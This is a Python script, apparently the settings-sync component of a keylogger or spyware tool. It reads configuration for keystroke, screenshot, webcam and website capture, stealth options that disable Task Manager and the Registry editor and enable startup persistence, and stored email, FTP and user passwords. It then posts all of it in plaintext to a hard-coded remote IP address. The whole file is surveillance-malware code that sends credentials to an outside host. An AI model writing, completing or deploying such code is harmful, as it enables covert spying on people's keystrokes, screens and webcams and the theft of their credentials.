import sqlite3
import json
import requests
from getsqldata import *

uid = getCurrentUser()

#9ồng bộ lên web
db = open("database.db",'a+')
db.close()

upload = sqlite3.connect("database.db")

c = upload.cursor()

c.execute('select * from AlertList')
keywordAlert = c.fetchall()

c.execute('select * from Alerts')
alertSettings = c.fetchall()

c.execute('select * from Email')
emailSettings = c.fetchall()

c.execute('select * from EmailDelivery')
emailDeliverySettings = c.fetchall()

c.execute('select * from FTP')
ftpSettings = c.fetchall()

c.execute('select * from FTPServer')
ftpServerSettings = c.fetchall()

c.execute('select * from General')
generalSettings = c.fetchall()

c.execute('select * from Screenshot')
screenshotSettings = c.fetchall()

#target list
targetApp = getColumnValue('byApp','TargetList',uid)
targetTitle = getColumnValue('byName','TargetList',uid)

c.execute('select * from Targets')
targetSettings = c.fetchall()

c.execute('select * from Users')
userSettings = c.fetchall()

c.execute('select * from Webcam')
webcamSettings = c.fetchall()

settings = {}

Users = {}
Users['username'] = userSettings[0][1]
Users['password'] = userSettings[0][2]
settings['user'] = Users['username']

print(settings['user'])


#alert list
keywordAlertList = []
for i in keywordAlert:
    keywordAlertList.append(i[1])

keywordAlert = {}
keywordAlert['name'] = "keywordAlert"
keywordAlert['user'] = Users['username']
keywordAlert['list'] = keywordAlertList
settings['keywordAlert'] = keywordAlert

#target list

print(targetApp)
print(targetTitle)

keywordTargetList = {}
keywordTargetList['name'] = "keywordTarget"
keywordTargetList['user'] = Users['username']
keywordTargetList['application'] = targetApp
keywordTargetList['title'] = targetTitle
settings['keywordTarget'] = keywordTargetList

######################
alert = {}
alert['name'] = "alert"
alert['user'] = Users['username']
alert['enableEmail'] = alertSettings[0][1] == 1 and True or False
print(alertSettings[0][2] == 1 and True or False)
alert['enableScreenshot'] = alertSettings[0][2] == 1 and True or False
settings['alert'] = alert

email = {}
email['name'] = "email"
email['user'] = Users['username']
email['enableClear'] = emailSettings[0][10] == 1 and True or False
email['enableEmail'] = emailSettings[0][1] == 1 and True or False
email['enableLimit'] = emailSettings[0][8] == 1 and True or False
email['enableUploadImage'] = emailSettings[0][5] == 1 and True or False
email['enableUploadKeystroke'] = emailSettings[0][4] == 1 and True or False
email['enableUploadWebcam'] = emailSettings[0][6] == 1 and True or False
email['enableUploadWebsite'] = emailSettings[0][7] == 1 and True or False
email['hoursEmail'] = emailSettings[0][2]
email['limitEmail'] = emailSettings[0][9]
email['minutesEmail'] = emailSettings[0][3]
email['passwordEmail'] = emailDeliverySettings[0][5]
email['passwordZipEmail'] = emailSettings[0][11]
email['portEmail'] = emailDeliverySettings[0][3]
email['smtpEmail'] = emailDeliverySettings[0][2]
email['subjectEmail'] = emailDeliverySettings[0][6]
email['userEmail'] = emailDeliverySettings[0][4]
email['enableZip'] = emailSettings[0][12] == 1 and True or False
email['sendTo'] = emailDeliverySettings[0][1]
settings['email'] = email

ftp = {}
ftp['name'] = "ftp"
ftp['user'] = Users['username']
ftp['enableClear'] = ftpSettings[0][10] == 1 and True or False
ftp['enableFTP'] = ftpSettings[0][1] == 1 and True or False
ftp['enablePassive'] = ftpServerSettings[0][5] == 1 and True or False
ftp['enableUploadImage'] = ftpSettings[0][5] == 1 and True or False
ftp['enableUploadKeystroke'] = ftpSettings[0][4] == 1 and True or False
ftp['enableUploadWebcam'] = ftpSettings[0][6] == 1 and True or False
ftp['enableUploadWebsite'] = ftpSettings[0][7] == 1 and True or False
ftp['hostnameFTP'] = ftpServerSettings[0][1]
ftp['hoursFTP'] = ftpSettings[0][2]
ftp['limitFTP'] = ftpSettings[0][9]
ftp['minutesFTP'] = ftpSettings[0][3]
ftp['passwordFTP'] = ftpServerSettings[0][3]
ftp['remoteDirFTP'] = ftpServerSettings[0][4]
ftp['userFTP'] = ftpServerSettings[0][2]
ftp['enableLimit'] = ftpSettings[0][8] == 1 and True or False
settings['ftp'] = ftp

general = {}
general['name'] = "general"
general['user'] = Users['username']
general['disableRegistry'] = generalSettings[0][2] == 1 and True or False
general['disableTaskManager'] = generalSettings[0][1] == 1 and True or False
general['enableEncrypt'] = generalSettings[0][3] == 1 and True or False
general['enableHotkey'] = generalSettings[0][5] == 1 and True or False
general['enableStartup'] = generalSettings[0][4] == 1 and True or False
general['hotkeyGeneral'] = generalSettings[0][6]
settings['general'] = general

screenshot = {}
screenshot['name'] = "screenshot"
screenshot['user'] = Users['username']
screenshot['deleteScreenshot'] = screenshotSettings[0][5]
screenshot['enableDelete'] = screenshotSettings[0][4] == 1 and True or False
screenshot['enableDouble'] = screenshotSettings[0][3] == 1 and True or False
screenshot['enableScreenshot'] = screenshotSettings[0][1] == 1 and True or False
screenshot['enableTimestamp'] = screenshotSettings[0][2] == 1 and True or False
screenshot['hoursScreenshot'] = screenshotSettings[0][6]
screenshot['minutesScreenshot'] = screenshotSettings[0][7]
screenshot['qualityScreenshot'] = screenshotSettings[0][8]
screenshot['dateDelete'] = screenshotSettings[0][9]
settings['screenshot'] = screenshot

target = {}
target['name'] = "target"
target['user'] = Users['username']
target['enableAll'] = targetSettings[0][1] == 1 and True or False
target['enableOnly'] = targetSettings[0][2] == 1 and True or False
settings['target'] = target

webcam = {}
webcam['name'] = "webcam"
webcam['user'] = Users['username']
webcam['enableWebcam'] = webcamSettings[0][1] == 1 and True or False
webcam['hoursWebcam'] = webcamSettings[0][2]
webcam['minutesWebcam'] = webcamSettings[0][3]
webcam['enableDelete'] = webcamSettings[0][4] == 1 and True or False
webcam['daysWebcam'] = webcamSettings[0][5]
webcam['enableDeleteUpload'] = webcamSettings[0][7] == 1 and True or False
# missing datetime 
webcam['dateDelete'] = webcamSettings[0][6]
settings['webcam'] = webcam



upload.commit()
upload.close()

url = "http://178.128.85.16/sync-settings-up"
headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}
r = requests.post(url, data=json.dumps(settings), headers=headers)
